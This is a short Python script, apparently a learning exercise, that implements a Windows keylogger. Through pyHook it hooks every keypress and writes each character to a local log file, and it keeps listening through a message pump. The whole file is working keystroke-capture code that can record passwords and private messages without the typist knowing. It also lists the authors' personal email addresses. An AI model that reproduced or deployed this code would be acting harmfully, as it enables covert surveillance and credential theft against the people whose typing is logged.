""""Author: Juan Luis Mendiola Gutiérrez
            Juan Pablo Ramírez Ibarra
     email: jlmg67815@gmail.com
            pablo.ram232@gmail.com """
import pyHook
import sys
import pythoncom
import logging

file_log = 'C:\\Users\\windows\\PycharmProjects\\pillow\\applications_of_python\\key_logger\\log.txt'


def on_keyboard_event(event):

    logging.basicConfig(filename=file_log, level=logging.DEBUG, format='%(message)s')
    chr(event.Ascii)
    logging.log(10, chr(event.Ascii))
    return True


hooks_manager = pyHook.HookManager()
hooks_manager.keyDown = on_keyboard_event
hooks_manager.HookKeyboard()
pythoncom.PumpMessages()